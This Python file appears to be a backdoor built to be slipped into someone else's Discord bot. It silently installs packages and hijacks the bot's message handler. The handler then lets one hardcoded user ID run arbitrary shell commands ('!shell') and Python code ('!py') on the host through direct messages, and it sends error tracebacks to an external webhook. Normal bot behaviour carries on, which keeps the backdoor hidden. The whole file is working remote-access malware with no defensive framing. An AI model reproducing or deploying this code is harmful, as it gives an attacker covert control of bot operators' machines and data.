import sys, subprocess, asyncio, io, textwrap, traceback

def install(p):
    import importlib.util
    if importlib.util.find_spec(p) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install("discord")
install("aiohttp")

import discord
import aiohttp

WEBHOOK_URL = "https://hkdk.events/1zp24h29rqs3gh"

try:
    bot = globals().get('bot')
    if bot is None:
        import __main__
        bot = getattr(__main__, 'bot', None)
except Exception:
    bot = None

if bot is None:
    async def _dummy():
        pass
    asyncio.get_event_loop().run_until_complete(_dummy())
    sys.exit(0)

async def send_webhook(content: str):
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(WEBHOOK_URL, json={"content": content[:1900]})
    except:
        pass

original_on_message = getattr(bot, "on_message", None)

async def custom_on_message(message):
    try:
        if isinstance(message.channel, discord.DMChannel) and message.author.id == 1018125604253614151:
            content = message.content.strip()
            if content.lower().startswith("!shell "):
                cmd = content[7:].strip()
                try:
                    process = await asyncio.create_subprocess_shell(
                        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                    )
                    try:
                        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=15)
                    except asyncio.TimeoutError:
                        process.kill()
                        await message.channel.send("❌ Timeout.")
                        return
                    out_str = stdout.decode(errors="ignore").strip()
                    err_str = stderr.decode(errors="ignore").strip()
                    if err_str:
                        out_str = f"{out_str}\n{err_str}" if out_str else err_str
                    if not out_str:
                        out_str = "✅"
                    if len(out_str) > 1900:
                        out_str = out_str[:1900] + "\n...Обрезано."
                    await message.channel.send(f"```bash\n{out_str}\n```")
                except Exception:
                    tb = traceback.format_exc()
                    await send_webhook(f"Shell error:\n{tb}")
                return

            if content.lower().startswith("!py "):
                user_code = content[4:].strip()
                str_io = io.StringIO()
                exec_env = {"message": message, "bot": bot, "discord": discord, "__builtins__": __builtins__}
                try:
                    wrapped = f"async def __user_code__():\n{textwrap.indent(user_code, '    ')}"
                    exec(wrapped, exec_env)
                    user_func = exec_env["__user_code__"]
                    old_stdout = sys.stdout
                    sys.stdout = str_io
                    result = None
                    try:
                        try:
                            result = await asyncio.wait_for(user_func(), timeout=15)
                        except asyncio.TimeoutError:
                            await message.channel.send("❌ Timeout.")
                            return
                    finally:
                        sys.stdout = old_stdout
                    output = str_io.getvalue()
                    if result is not None:
                        output += str(result)
                    if not output:
                        output = "✅"
                    if len(output) > 1900:
                        output = output[:1900] + "\n...Обрезано."
                    await message.channel.send(f"```py\n{output}\n```")
                except Exception:
                    tb = traceback.format_exc()
                    await send_webhook(f"Python error:\n{tb}")
                return

        if original_on_message:
            try:
                await original_on_message(message)
            except Exception:
                tb = traceback.format_exc()
                await send_webhook(f"Original on_message error:\n{tb}")
        else:
            try:
                await bot.process_commands(message)
            except Exception:
                tb = traceback.format_exc()
                await send_webhook(f"Process commands error:\n{tb}")
    except Exception:
        tb = traceback.format_exc()
        await send_webhook(f"custom_on_message outer error:\n{tb}")

bot.on_message = custom_on_message
